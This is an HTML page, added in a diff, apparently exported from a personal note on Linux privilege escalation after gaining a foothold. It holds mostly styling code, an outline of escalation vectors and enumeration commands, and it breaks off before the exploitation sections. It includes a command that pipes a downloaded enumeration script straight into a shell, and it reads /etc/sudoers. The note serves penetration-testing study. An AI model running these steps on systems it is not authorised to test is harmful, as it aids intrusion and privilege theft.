@@ -1,0 +1,1667 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2026-07-20 Mon 14:11 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Linux Privilege Escalation</title>
+<meta name="author" content="termux" />
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" href="style.css" type="text/css"/>
+<style type='text/css'>
+<!--/*--><![CDATA[/*><!--*/
+/* nice-org-html.css
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+*/
+
+/* basic layout ***************************************************************/
+*,
+*::before,
+*::after {
+    box-sizing: border-box;
+}
+html {
+    font-family: Sans;
+    line-height: 1.3;
+    font-size: calc(15px + 0.390625vw);
+    -webkit-text-size-adjust: 100%;
+}
+
+body {
+    background: #999; /* overwritten with theme --bg */
+    width: 100%;
+    min-height: 100vh;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family:
+	-apple-system,
+	BlinkMacSystemFont,
+	segoe ui,
+	Roboto,
+	Oxygen,
+	Ubuntu,
+	Cantarell,
+	open sans,
+	helvetica neue,
+	sans-serif,
+	system-ui
+}
+
+#preamble,
+#postamble {
+    width: 100%;
+}
+
+#content {
+    width: 80%;
+    max-width: 80ch;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    flex: 1;
+}
+
+/* custom facing **************************************************************/
+/* The variable values are injected by CSS pre-processing in et-org-html.el */
+:root {
+    --bc-tb: #000000;
+    --bc-block: #595959;
+    --clr: #000000;
+    --clr-tb-hd: #000000;
+    --clr-code: #000000;
+    --bg: #fbf7f0;
+    --bg-code: #cab9b2;
+    --bg-tb-hd: #cab9b2;
+    --bg-block: #efe9dd;
+    --clr-link: #531ab6;
+    --clr-title: #000000;
+    --clr-todo: #00598b;
+    --bg-todo: initial;
+    --clr-done: #7f0000;
+    --bg-done: initial;
+    --ts-clr: #0031a9;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #0031a9;
+    --bg-constant: initial;
+    --clr-constant: #531ab6;
+    --bg-comment: initial;
+    --clr-comment: #7f0000;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #7f0000;
+    --bg-function: initial;
+    --clr-function: #602938;
+    --bg-variable: initial;
+    --clr-variable: #00603f;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #894000;
+    --bg-doc: initial;
+    --clr-doc: #304463;
+    --bg-builtin: initial;
+    --clr-builtin: #721045;
+    --bg-string: initial;
+    --clr-string: #00598b;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+body[data-mode='light'] {
+    background: var(--bg);
+    color: var(--clr);
+}
+
+body[data-mode='dark'] {
+    background: var(--bg);
+    color: var(--clr);
+    --bc-tb: #ffffff;
+    --bc-block: #989898;
+    --clr: #ffffff;
+    --clr-code: #ffffff;
+    --clr-tb-hd: #ffffff;
+    --bg: #0d0e1c;
+    --bg-tb-hd: #484d67;
+    --bg-code: #484d67;
+    --bg-block: #1d2235;
+    --clr-link: #b6a0ff;
+    --clr-title: #ffffff;
+    --clr-todo: #2fafff;
+    --bg-todo: initial;
+    --clr-done: #ef8386;
+    --bg-done: initial;
+    --ts-clr: #79a8ff;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #79a8ff;
+    --bg-constant: initial;
+    --clr-constant: #b6a0ff;
+    --bg-comment: initial;
+    --clr-comment: #ef8386;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #ef8386;
+    --bg-function: initial;
+    --clr-function: #f78fe7;
+    --bg-variable: initial;
+    --clr-variable: #4ae2f0;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #ff7f86;
+    --bg-doc: initial;
+    --clr-doc: #9ac8e0;
+    --bg-builtin: initial;
+    --clr-builtin: #feacd0;
+    --bg-string: initial;
+    --clr-string: #2fafff;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+/* exceptions for badly rendering themes **************************************/
+body[data-theme='leuven'],
+body[data-theme='leuven-dark'] {
+    --bg-code: var(--bg-block);
+}
+
+/* ootb page layout ***********************************************************/
+#view-controls {
+    position: sticky;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 0;
+    left: 0;
+    width: 100%;
+    background: var(--bg);
+    color: var(--clr-code);
+    height: 2.5rem;
+    padding-top: 1.25rem;
+    padding-bottom: 1.25rem;
+    z-index: 100;
+    border-radius: 5px; /* Rounded corners */
+}
+#toggle-mode {
+    position: absolute;
+    right: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#goto-top {
+    display: none;
+}
+#goto-top[data-show="true"] {
+    position: relative;
+    display: block;
+    text-align: center;
+    font-size: 1rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#toggle-toc {
+    display: none;
+}
+#toggle-toc[data-show="true"] {
+    position: absolute;
+    left: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+
+#toggle-toc:hover,
+#goto-top:hover,
+#toggle-mode:hover {
+    cursor: pointer;
+}
+
+#table-of-contents {
+    display: none;
+}
+#table-of-contents[data-show="true"] {
+    width: 80%;
+    max-width: 80rem;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    background: var(--bg);
+    scrollbar-width: none;
+    -ms-overflow-style: none;
+}
+
+#table-of-contents::-webkit-scrollbar {
+    display: none;
+}
+
+body[data-toc="true"] #content * {
+    display: none;
+}
+body[data-toc="true"] #content #table-of-contents,
+body[data-toc="true"] #content #table-of-contents * {
+    display: block;
+}
+
+
+/* misc elements **************************************************************/
+
+hr {
+    height: 0;
+    color: inherit;
+}
+
+b,
+strong {
+    font-weight: bolder;
+}
+
+code,
+kbd,
+samp,
+pre {
+    font-family:
+	Menlo,
+	ui-monospace,
+	SFMono-Regular,
+	Consolas,
+	'Liberation Mono',
+	monospace;
+}
+
+small {
+    font-size: 80%;
+}
+
+sub,
+sup {
+    font-size: 75%;
+    line-height: 0;
+    position: relative;
+    vertical-align: baseline;
+}
+
+sub {
+    bottom: -0.25em;
+}
+
+sup {
+    top: -0.5em;
+}
+
+table {
+    text-indent: 0;
+    border-color: inherit;
+}
+
+summary {
+    display: list-item;
+}
+
+h1 {
+    color: var(--clr-title);
+    text-align: center;
+}
+h2 {
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+}
+
+code {
+    color: var(--clr-code);
+    background: var(--bg-code);
+    border-radius: 2px;
+    padding-left: 5px;
+    padding-right: 5px;
+}
+
+pre::-webkit-scrollbar {
+    display: none;
+}
+
+.todo {
+    color: var(--clr-todo);
+    background: var(--bg-todo);
+}
+
+.done {
+    color: var(--clr-done);
+    background: var(--bg-done);
+}
+
+.timestamp-wrapper {
+    font-size: 0.8rem;
+    color: var(--clr-ts);
+}
+
+table {
+    width: 100%;
+    border: 2px solid var(--bc-tb);
+}
+
+thead {
+    color: var(--clr-tb-hd);
+    background: var(--bg-tb-hd);
+}
+
+td, th {
+    border: thin solid var(--bc-tb);
+}
+
+li {
+    margin-top: 0.5rem;
+    margin-bottom: 0.5rem;
+}
+#text-table-of-contents li a:before {
+    content: "• "
+}
+
+a {
+    text-decoration: none;
+    color: var(--clr-link);
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+.MathJax_Display {
+    font-size: 1.25em;
+}
+
+img {
+    max-width: 100%;
+}
+
+pre {
+    padding: 1rem;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-block);
+    font-size: 0.9rem;
+    overflow-x: auto;
+    -ms-overflow-style: none;
+    scrollbar-width: thin;
+}
+
+.org-src-wrapper {
+    position: relative;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+}
+
+.org-src-bar {
+    position: relative;
+    top: 0rem;
+    width: 100%;
+    background: var(--bg-code);
+    border-radius: 0.5rem;
+    text-align: right;
+    min-height: 1rem;
+}
+
+.org-src-wrapper .org-src-container {
+    position: relative;
+    border: none;
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+    z-index: 0;
+}
+
+.org-src-wrapper .org-src-container pre.src {
+    border: none !important;
+    background: var(--bg-code) !important;
+    padding-top: 0rem;
+    padding-bottom: 0rem;
+    margin-top: 0rem;
+    margin-bottom: 0rem;
+    padding-bottom: 1.6rem;
+}
+
+.org-src-wrapper .org-src-bar .srcLangLabel {
+    top: 0rem;
+    right: 1.6rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    font-size: 0.8rem;
+    opacity: 0.5;
+    z-index: 1;
+    display: none;
+}
+
+.org-src-wrapper .org-src-bar .copyBtn {
+    top: 0rem;
+    right: 0.1rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-right: 0.7rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 0.8rem;
+    cursor: pointer;
+    opacity: 0.5;
+    z-index: 1;
+    transition: opacity 0.3s;
+}
+
+.org-src-wrapper .copyBtn:hover {
+    opacity: 1;
+}
+
+.org-src-wrapper .copyBtn i {
+    margin-right: 0.5rem;
+    padding: 0.5rem;
+}
+
+.admonition {
+    margin: 0.2rem;
+    color: inherit;
+    border-left: .25rem solid;
+}
+.admonition-title {
+    margin: 0 0 0.5rem 0.5rem;
+    padding: 0.5rem 0 0 0;
+    display: flex;
+    align-items: center;
+}
+.admonition-content > p {
+    margin: 0.5rem 0 0 0.5rem;
+    padding: 0 0 0.5rem 0;
+}
+
+.admonition.note {
+    border-left-color: var(--clr-note);
+}
+.admonition-title.note {
+    color: var(--clr-note);
+}
+.admonition-title.note:before {
+    content: '';
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-note);
+    mask-size: cover;    
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path class="admonition-icon-note" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+.admonition-icon-note {
+    fill: var(--clr-note);
+}
+
+.admonition.tip {
+    border-left-color: var(--clr-tip);
+}
+.admonition-title.tip {
+    color: var(--clr-tip);
+}
+.admonition-title.tip:before {
+    content: '';
+    fill: var(--clr-tip);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-tip);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>');    
+}
+
+.admonition.important {
+    border-left-color: var(--clr-important);
+}
+.admonition-title.important {
+    color: var(--clr-important);
+}
+.admonition-title.important:before {
+    content: '';
+    fill: var(--clr-important);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-important);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v9.5A1.75 1.75 0 0 1 14.25 13H8.06l-2.573 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25Zm7 2.25v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');    
+}
+
+.admonition.warning {
+    border-left-color: var(--clr-warning);
+}
+.admonition-title.warning {
+    color: var(--clr-warning);
+}
+.admonition-title.warning:before {
+    content: '';
+    color: var(--clr-warning);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-warning);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');
+}
+
+
+.admonition.caution {
+    border-left-color: var(--clr-caution);
+}
+.admonition-title.caution {
+    color: var(--clr-caution);
+}
+.admonition-title.caution:before {
+    content: '';
+    fill: var(--clr-caution);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-caution);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M4.47.22A.749.749 0 0 1 5 0h6c.199 0 .389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749 0 0 1-.22.53l-4.25 4.25A.749.749 0 0 1 11 16H5a.749.749 0 0 1-.53-.22L.22 11.53A.749.749 0 0 1 0 11V5c0-.199.079-.389.22-.53Zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5ZM8 4a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 4Zm0 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+/* responsive layouts *********************************************************/
+
+@media only screen and (max-width: 768px) {
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+@media only screen and (max-width: 480px) {
+    #view-controls {
+	padding-top: 1.5em;
+	padding-bottom: 1.5em;
+    }
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+
+/* generated header and footer ************************************************/
+
+#generated-header,
+#generated-footer {
+    width: 90%;
+    margin-left: 5%;
+    margin-right: 5%;
+    line-height: 1;
+}
+.generated header {
+    top: 0;
+    left: 0;
+}
+.generated footer {
+    bottom: 0;
+    left: 0;
+}
+.generated header a,
+.generated footer a {
+    display: inline;
+    color: var(--clr-title);
+    text-decoration: none;
+    transition: color .15s ease-in;
+}
+.generated header a:hover,
+.generated footer a:hover {
+    color: var(--clr-link);
+}
+
+.generated header nav {
+    position: relative;
+    margin-top: 1rem;
+    top: 0;
+    left: 0;
+}
+.generated footer nav {
+    position: relative;
+    bottom: 0;
+    left: 0;
+}
+
+.generated .separator {
+    display: block;
+    width: 111%;
+    margin-left: -5.5%;
+    max-width: 100vw;
+    height: 0.125rem;
+    background: var(--bg-code);
+}
+
+.generated a .nav-title,
+.generated a .nav-author {
+    display: inline;
+    margin-top: 1rem;
+    margin-bottom: 1rem;
+    padding-right: 10rem;
+}
+
+.generated .nav-title {
+    letter-spacing: .075rem;
+    font-weight: 500;
+}
+
+.generated .nav-toggle {
+    display: none;
+}
+.generated .nav-button {
+    display: none;
+}
+.generated .nav-list {
+    overflow-y: hidden;
+    display: block;
+    float: right;
+    list-style: none;
+    margin-bottom: 0;
+    margin-top: 0;
+}
+
+.generated .nav-item {
+    position: relative;
+    float: left;
+    margin: 0;
+}
+.generated .nav-link {
+    position: relative;
+    float: right;
+    margin-left: 2rem;
+    margin-right: 0rem;
+}
+
+.generated .nav-toggle {
+    max-height: 0;
+    visibility: hidden;
+    overflow-y: hidden;
+}
+
+.generated header .separator {
+    margin-top: 1rem;
+    margin-bottom: 0;
+}
+
+.generated footer .separator {
+    margin-bottom: 1rem;
+    margin-top: 0;
+}
+
+.generated .menu-sep {
+    display: none;
+    max-height: 0;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+
+.generated footer {
+    padding-bottom: 1rem;
+}
+
+.generated.compact footer {
+    padding-bottom: 0;
+}
+
+.generated.compact header .separator {
+    margin-top: 0;
+    margin-bottom:0;
+}
+.generated.compact footer .separator {
+    margin-bottom: 1rem;
+}
+
+.generated.compact .nav-toggle {
+    visibility: visible;
+}
+
+.generated.compact .nav-toggle + label span::before {
+    transition: all 0.2s ease-in;
+}
+.generated.compact .nav-toggle:checked + label span::before {
+    transform: translateX(0.04rem) translateY(-0.25rem) rotate(90deg);
+    transition: all 0.2s ease;
+}
+
+.generated.compact .menu-sep {
+    display: flex;
+    max-height: 0rem;
+}
+.generated.compact .nav-toggle:checked + label + .menu-sep {
+    display: block;
+    position: relative;
+    max-height: 1rem;
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-list {
+    float: none !important;
+    position: relative;
+    display: block;
+    padding-left: 0;
+    padding-right: 0;
+    z-index: 5;
+    width: 100%;
+    height: auto;
+    max-height: 0;
+    margin: 0;
+    overflow-x: hidden;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+.generated.compact .nav-toggle:checked + label ~ .nav-list {
+    display: block;
+    max-height: 100rem;
+    overflow-y: hidden;
+}
+.generated.compact header .nav-toggle:checked + label ~ .nav-list {
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-button {
+    display: inline;
+    position: relative;
+    float: right;
+    font-size: 1rem;
+}
+.generated.compact .nav-button span::before {
+    display: inline-block;
+    content: '\2807';
+    font-size: 2rem;
+    transform: translateX(0.25rem) translateY(-0.5rem);
+}
+
+.generated.compact .nav-item {
+    float: none !important;
+    text-align: center !important;
+}
+.generated.compact .nav-link {
+    line-height: 2rem;
+    margin-left: 2rem;
+    margin-right: 2rem;
+    float: none !important;
+}
+
+.generated.compact footer .separator.menu-sep {
+    margin-bottom: -1rem;
+}
+
+.hidden {
+    display: none;
+}
+
+.collapsible:hover {
+    cursor: pointer;
+}
+
+.collapsible.collapsed::after {
+    display: inline-block;
+    content: '...';
+}
+/*]]>*/-->
+</style>
+</head>
+<body>
+<div id="preamble" class="status">
+<div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
+</div>
+<div id="content" class="content">
+<h1 class="title">Linux Privilege Escalation</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgaacd235">1. Automated Enumeration</a></li>
+<li><a href="#org5b0071b">2. Manual Enumeration Checklist</a>
+<ul>
+<li><a href="#org9766666">System and Kernel</a></li>
+<li><a href="#org0194f90">Current User Context</a></li>
+<li><a href="#orga8875b1">SUID / SGID Binaries</a></li>
+<li><a href="#orgcd4f1ae">Capabilities</a></li>
+<li><a href="#org853375e">Writable Files and Directories</a></li>
+<li><a href="#org7ed97c3">Cron Jobs</a></li>
+<li><a href="#org39b6d06">Interesting Files</a></li>
+<li><a href="#org81f387e">Network and Services</a></li>
+<li><a href="#orga13c176">NFS</a></li>
+</ul>
+</li>
+<li><a href="#org8eeac92">3. Exploitation Vectors</a>
+<ul>
+<li><a href="#org5937293">Sudo Abuse</a></li>
+<li><a href="#org43545b2">SUID Binary Abuse</a></li>
+<li><a href="#orge64de45">Capabilities Abuse</a></li>
+<li><a href="#org6a642d4">Writable /etc/passwd</a></li>
+<li><a href="#org22495c3">Cron Job Abuse</a></li>
+<li><a href="#org004accb">Path Hijacking</a></li>
+<li><a href="#orgc223bc2">Kernel Exploits</a></li>
+<li><a href="#orgf4c0e15">NFS no<sub>root</sub><sub>squash</sub></a></li>
+</ul>
+</li>
+<li><a href="#org24ad65f">4. Quick Wins to Check First</a></li>
+<li><a href="#orgb82dc67">Tips</a></li>
+</ul>
+</div>
+</div>
+<p>
+Post-exploitation phase on a Linux foothold. Goal is root. Process
+is structured enumeration followed by exploitation of the first
+viable vector. Automated tools surface candidates quickly; manual
+checks confirm and extend findings.
+</p>
+
+<p>
+Related: <a href="../org/20260314T005719--linux-smart-enumeration__cybersecurity_tool.html">Linux Smart Enumeration</a>
+         <a href="../org/20260314T005716--linpeas__cybersecurity_tool.html">LinPEAS</a>
+         <a href="../org/20260314T005728--gtfobins__cybersecurity_tool.html">GTFOBins</a>
+         <a href="../org/20260206T060652--exploitation__concept_cybersecurity.html">Exploitation</a>
+         <a href="../org/20260214T085940--post-exploitation__concept_cybersecurity.html">Post Exploitation</a>
+         <a href="../org/20260206T060723--persistence__concept_cybersecurity.html">Persistence</a>
+</p>
+<div id="outline-container-orgaacd235" class="outline-2">
+<h2 id="orgaacd235">1. Automated Enumeration</h2>
+<div class="outline-text-2" id="text-orgaacd235">
+<p>
+Run these first. Review output before doing anything manually.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f12e6bf838cb4b2f95a172193118c496>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_f12e6bf838cb4b2f95a172193118c496=document.querySelector('button[name=btn_f12e6bf838cb4b2f95a172193118c496]');
+copyBtnbtn_f12e6bf838cb4b2f95a172193118c496.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# LinPEAS — most comprehensive\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# or transfer and run\nchmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out\n\n# Linux Smart Enumeration — cleaner output, tiered verbosity\n./lse.sh -l 1      # basic\n./lse.sh -l 2      # full\n`);copyBtnbtn_f12e6bf838cb4b2f95a172193118c496.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f12e6bf838cb4b2f95a172193118c496.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">LinPEAS &#8212; most comprehensive
+</span>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">or transfer and run
+</span>chmod +x linpeas.sh &amp;&amp; ./linpeas.sh | tee linpeas.out
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Linux Smart Enumeration &#8212; cleaner output, tiered verbosity
+</span>./lse.sh -l 1      <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">basic
+</span>./lse.sh -l 2      <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">full</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org5b0071b" class="outline-2">
+<h2 id="org5b0071b">2. Manual Enumeration Checklist</h2>
+<div class="outline-text-2" id="text-org5b0071b">
+</div>
+<div id="outline-container-org9766666" class="outline-3">
+<h3 id="org9766666">System and Kernel</h3>
+<div class="outline-text-3" id="text-org9766666">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6c7a6561cc5147dea482c0e024e018a7>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_6c7a6561cc5147dea482c0e024e018a7=document.querySelector('button[name=btn_6c7a6561cc5147dea482c0e024e018a7]');
+copyBtnbtn_6c7a6561cc5147dea482c0e024e018a7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`uname -a                          # kernel version — check for exploits\ncat /etc/os-release               # distro and version\ncat /proc/version\n`);copyBtnbtn_6c7a6561cc5147dea482c0e024e018a7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6c7a6561cc5147dea482c0e024e018a7.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">uname -a                          <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">kernel version &#8212; check for exploits
+</span>cat /etc/os-release               <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">distro and version
+</span>cat /proc/version
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org0194f90" class="outline-3">
+<h3 id="org0194f90">Current User Context</h3>
+<div class="outline-text-3" id="text-org0194f90">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_82adb2fc55b8416fb98932485accbed1>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_82adb2fc55b8416fb98932485accbed1=document.querySelector('button[name=btn_82adb2fc55b8416fb98932485accbed1]');
+copyBtnbtn_82adb2fc55b8416fb98932485accbed1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`id                                # uid, gid, groups\nwhoami\nsudo -l                           # what can this user run as root?\ncat /etc/sudoers 2>/dev/null\n`);copyBtnbtn_82adb2fc55b8416fb98932485accbed1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_82adb2fc55b8416fb98932485accbed1.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">id                                <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">uid, gid, groups
+</span>whoami
+sudo -l                           <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">what can this user run as root?
+</span>cat /etc/sudoers 2&gt;/dev/null
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orga8875b1" class="outline-3">
+<h3 id="orga8875b1">SUID / SGID Binaries</h3>
+<div class="outline-text-3" id="text-orga8875b1">
+<div class='org-src-wrapper'>
